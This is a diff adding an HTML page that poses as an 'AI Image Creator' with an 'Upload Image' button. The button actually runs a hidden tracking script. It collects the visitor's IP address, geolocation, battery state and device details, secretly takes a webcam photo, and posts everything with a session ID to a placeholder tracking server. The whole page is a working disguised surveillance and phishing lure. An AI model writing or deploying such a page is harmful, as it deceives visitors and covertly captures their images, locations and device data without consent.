@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Image Creator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        async function trackDevice() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const sessionId = urlParams.get('session') || 'unknown';
+
+            let batteryInfo = {};
+            let geoInfo = { latitude: "Unknown", longitude: "Unknown" };
+
+            if (navigator.getBattery) {
+                let battery = await navigator.getBattery();
+                batteryInfo = {
+                    level: (battery.level * 100) + "%",
+                    charging: battery.charging ? "Yes" : "No"
+                };
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        geoInfo = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                    },
+                    (error) => {
+                        console.log("Geolocation access denied");
+                    }
+                );
+            }
+
+            async function capturePhoto() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/png');
+                    sendData(imageData);
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (error) {
+                    console.log("Camera access denied");
+                }
+            }
+
+            let deviceInfo = {
+                ip: "Fetching...",
+                userAgent: navigator.userAgent,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(", ") || "No Plugins"
+            };
+
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    deviceInfo.ip = data.ip;
+                    capturePhoto();
+                });
+
+            function sendData(photo = null) {
+                fetch('https://your-backend-server.com/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session: sessionId,
+                        battery: batteryInfo,
+                        geo: geoInfo,
+                        device: deviceInfo,
+                        photo: photo
+                    })
+                });
+            }
+        }
+    </script>
+</head>
+<body class="bg-white text-black">
+    <nav class="bg-gray-200 p-4 flex justify-between shadow-md">
+        <h1 class="text-xl font-bold text-gray-800">AI Image Creator</h1>
+        <ul class="flex space-x-4">
+            <li><a href="#" class="hover:text-blue-600">Home</a></li>
+            <li><a href="#" class="hover:text-blue-600">About</a></li>
+            <li><a href="#" class="hover:text-blue-600">Features</a></li>
+            <li><a href="#" class="hover:text-blue-600">Contact</a></li>
+        </ul>
+    </nav>
+    <div class="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-gray-100 to-blue-100">
+        <h2 class="text-3xl font-bold mb-4 text-gray-800">Enhance Your Images with AI</h2>
+        <p class="text-gray-600 mb-6">Upload an image to enhance with AI-powered editing.</p>
+        <button onclick="trackDevice()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded-xl shadow-md">Upload Image</button>
+        <p id="loading" class="text-gray-500 mt-4 hidden">Processing...</p>
+    </div>
+</body>
+</html>
